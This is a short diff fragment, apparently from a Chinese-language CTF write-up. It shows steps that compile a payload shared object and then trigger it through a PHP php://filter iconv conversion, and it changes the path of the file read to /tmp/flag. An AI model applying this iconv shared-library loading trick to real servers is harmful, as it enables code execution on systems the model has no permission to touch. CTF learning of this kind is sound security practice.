@@ -157,7 +157,7 @@ gcc payload.c -o payload.so -shared -fPI
 <figure data-type="image" tabindex="8"><img src="https://uploader.shimo.im/f/9dhMibUsDp9EaGjU.png!thumbnail?fileGuid=XKy3Wck8hrhG3QQ9" alt="图片" loading="lazy"></figure>
 <p>触发so。获取返回结果</p>
 <pre><code class="language-plain">file_put_contents('php://filter/write=convert.iconv.payload.utf-8/resource=/tmp/guoke',123);
-file_get_contents('/tmp/file');
+file_get_contents('/tmp/flag');
 </code></pre>
 <figure data-type="image" tabindex="9"><img src="https://uploader.shimo.im/f/2UjXorAwah7FZtHc.png!thumbnail?fileGuid=XKy3Wck8hrhG3QQ9" alt="图片" loading="lazy"></figure>
 
